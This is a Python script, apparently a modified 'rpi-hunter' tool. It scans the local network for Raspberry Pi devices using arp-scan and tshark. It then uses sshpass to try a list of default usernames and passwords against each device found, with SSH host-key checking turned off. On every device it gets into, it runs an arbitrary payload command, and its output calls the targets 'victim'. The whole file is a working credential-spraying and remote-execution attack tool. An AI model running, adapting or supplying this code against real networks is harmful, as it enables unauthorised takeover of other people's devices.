#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
### ORIGINAL CODE BY BUSESCANFLY, MODIFIED BY TEAM ###
import os
import subprocess
from termcolor import colored, cprint
import os

main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
credentials_file = os.path.join(main_directory, "known_credentials", "pi")
with open(credentials_file, "r") as file:
	credentials = [line.strip().split(':') for line in file]
	user_password_list = [(user, password) for user, password in credentials]

# Scans the network for Raspberry Pi's.
def scan():
	main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
	scan_dir = os.path.join(main_directory, "scan")
 
	os.system(f"sudo arp-scan -I en0 -g --localnet -W {os.path.join(scan_dir, 'scan.pcap')}")
	os.system(f"tshark -r {os.path.join(scan_dir, 'scan.pcap')} > {os.path.join(scan_dir, 'pcap.txt')} 2>/dev/null")
	os.system(f"cat {os.path.join(scan_dir, 'pcap.txt')} | grep -i \"rasp\" > {os.path.join(scan_dir, 'raspi_list')}")
	os.system(f"awk '{{print $8}}' {os.path.join(scan_dir, 'raspi_list')} > {os.path.join(scan_dir, 'rpi_list')}")
	os.system(f"rm -rf {os.path.join(scan_dir, 'scan.pcap')} && rm -rf {os.path.join(scan_dir, 'pcap.txt')} && rm -rf {os.path.join(scan_dir, 'raspi_list')}")
	
	with open(os.path.join(scan_dir, 'rpi_list')) as inf:
		ip_list = [line.strip() for line in inf]
	return ip_list

# Send payload to Pi's.
# Requires a list of IP's, a username, credentials (password), and the payload.
def rpi(ip_list, credentials_list, payload):
	cprint(f"Loaded {str(len(ip_list))} IP(s).", "yellow")

	if len(ip_list) > 0:
		cprint(f"Loaded payload: {payload}", "green")
		cprint("Beginning to send payload to Pi's...", "blue")

		for ip in ip_list:
			print("")
			print(f"{colored('Attempting to sending payload to victim', 'yellow')} {colored(ip, 'red')}{colored('...', 'yellow')}")
			for user, creds in credentials_list:
				print(f"Attempting to send {colored(payload, 'cyan')} using username {colored(user, 'blue')} and password {colored(creds, 'blue')}...")
				try:
					ssh_command = f"sshpass -p \"{creds}\" ssh -o stricthostkeychecking=no {user}@{ip} {payload}"
					output = subprocess.check_output(ssh_command, shell=True, text=True)
					print(colored(f"Success! Output from {ip}:", "green"))
					print(output)
				except subprocess.CalledProcessError as e:
					print(colored(f"Failed to send payload to {ip} using username {user} and password {creds}.", "red"))
					print(colored(f"Error: {e}", "red"))
				print("")
	else:
		print(colored("Retreating, no IPs found...", "red"))

# Main function for rpi-hunter.
# If args.list is True, it will list available payloads.
# Otherwise, scan the network for Raspberry Pi's and send a payload to them.
def let_the_hunt_begin(payload):
	print(colored("Beginning network scan...", "blue"))
	rpi(scan(), user_password_list, payload)
